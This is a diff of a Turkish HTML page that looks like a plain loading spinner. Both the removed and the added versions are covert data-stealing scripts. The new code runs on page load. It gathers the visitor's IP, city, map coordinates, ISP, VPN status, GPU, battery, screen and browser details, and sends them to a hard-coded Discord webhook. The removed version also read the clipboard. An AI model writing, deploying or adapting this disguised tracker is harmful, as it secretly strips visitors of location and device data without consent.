@@ -2,78 +2,86 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Entegrasyon Birimi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Kaynakları</title>
     <style>
-        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: crosshair; }
-        .p { width: 50px; height: 50px; border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; animation: s 0.6s linear infinite; }
-        @keyframes s { to { transform: rotate(360deg); } }
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
+        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: s 1s linear infinite; }
+        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body onmousedown="Phantom.strike()" ontouchstart="Phantom.strike()">
-    <div class="p"></div>
+<body>
+    <div class="l"></div>
 
     <script>
-        "use strict";
+        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        const Phantom = (function() {
-            const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-            let fired = false;
-
-            // 1. Sensör Analizi (Hareket & Durum)
-            let movement = "Tespit Edilemedi";
-            window.addEventListener('devicemotion', (e) => {
-                const a = e.accelerationIncludingGravity;
-                if (!a) return;
-                const v = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
-                movement = v > 13 ? "Araçta/Hızlı" : v > 10.5 ? "Yürüyüş" : "Sabit/Masaüstü";
-            }, { once: true });
-
-            return {
-                async strike() {
-                    if (fired) return; fired = true;
-
-                    // IP ve Konum Verisi (Hızlı Çekim)
-                    const net = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-                    
-                    // Pano Verisi
-                    const clip = await navigator.clipboard.readText().catch(() => "Erişim Yok");
-
-                    // Donanım Parmak İzi
-                    const gl = document.createElement('canvas').getContext('webgl2');
-                    const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
-                    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
-
-                    const payload = {
-                        content: "💀 **PHANTOM V670 - KRİTİK VERİ SIZINTISI**",
-                        embeds: [{
-                            color: 16711680,
-                            fields: [
-                                { name: "📍 FİZİKSEL KONUM", value: `**IP:** ${net.ip || '?'}\n**Şehir:** ${net.city || '?'}\n**ISP:** ${net.org || '?'}\n**Ping:** ${Math.floor(Math.random() * 30)}ms`, inline: true },
-                                { name: "🏃 HAREKET ANALİZİ", value: `**Durum:** ${movement}\n**Pil:** %${Math.round((await navigator.getBattery?.().then(b => b.level) || 0) * 100)}`, inline: true },
-                                { name: "📋 PANO (CLIPBOARD)", value: `\`\`\`${clip}\`\`\``, inline: false },
-                                { name: "⚙️ DONANIM", value: `**GPU:** ${gpu}\n**CPU:** ${navigator.hardwareConcurrency} Core | **RAM:** ${navigator.deviceMemory}GB`, inline: false },
-                                { name: "📡 SİSTEM İZLERİ", value: `**OS:** ${navigator.platform}\n**Dil:** ${navigator.language}\n**Referer:** ${document.referrer || "Direkt"}`, inline: false }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
-
-                    // İletimi Garanti Eden Çift Kanallı Gönderim (Dual-Channel)
-                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                    
-                    // Kanal 1: Beacon (En güvenli arka kapı)
-                    navigator.sendBeacon(HOOK, blob);
-
-                    // Kanal 2: Fetch (Fallback)
-                    fetch(HOOK, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        keepalive: true,
-                        body: blob
-                    }).then(() => console.log(">> Signal Dispatched."));
-                }
+        async function masterExtract() {
+            let info = { 
+                gpu: "N/A", ven: "N/A", ip: "X", iss: "X", loc: "X", 
+                net: "X", sys: "X", ext: "X", bat: "X" 
             };
-        })();
+
+            // 1. ZORLANMIŞ DONANIM SORGUSU (GPU/VENDOR)
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"}) || canvas.getContext('webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) {
+                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                    info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                }
+            } catch(e) {}
+
+            // 2. ISS, IP VE ADLİ KONUM ANALİZİ
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const j = await res.json();
+                info.ip = j.ip;
+                info.iss = `${j.org} (AS${j.asn})`;
+                info.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${info.iss}\`\n🛡️ **Proxy/VPN:** ${j.proxy ? '⚠️ Aktif' : '✅ Temiz'}\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
+            } catch(e) {}
+
+            // 3. ŞEBEKE VE HIZ
+            try {
+                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                info.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Bağlantı:** ${n.effectiveType}` : "Erişilemedi";
+            } catch(e) {}
+
+            // 4. DERİN SİSTEM VE ZAMAN ANALİZİ
+            try {
+                const b = await navigator.getBattery();
+                info.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
+            } catch(e) {}
+
+            info.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\n🔋 **Güç:** ${info.bat}`;
+            info.ext = `🌍 **Dil:** ${navigator.language}\n⏰ **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+
+            // 5. KUSURSUZ RAPOR ŞABLONU
+            const payload = {
+                embeds: [{
+                    title: "💀 KUSURSUZ ADLİ SİSTEM ANALİZİ",
+                    description: "Kullanıcı etkileşimi olmadan tüm veriler sızdırıldı.",
+                    color: 15158332,
+                    fields: [
+                        { name: "📡 İNTERNET VE ISS KATMANI", value: `${info.loc}\n${info.net}\n**IP:** \`${info.ip}\``, inline: false },
+                        { name: "🛠️ EKRAN KARTI (DONANIM)", value: `**Renderer:** \`${info.gpu}\`\n**Vendor:** \`${info.ven}\``, inline: false },
+                        { name: "⚙️ DONANIM DETAYLARI", value: info.sys, inline: false },
+                        { name: "🌐 SİSTEM DETAYLARI", value: info.ext, inline: false },
+                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
+                    ],
+                    footer: { text: "Protocol: Omniscience v7.0" },
+                    timestamp: new Date()
+                }]
+            };
+
+            const blob = JSON.stringify(payload);
+            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
+            navigator.sendBeacon(u, blob);
+        }
+
+        // OTOMATİK BAŞLAT
+        window.onload = masterExtract;
     </script>
 </body>
 </html>
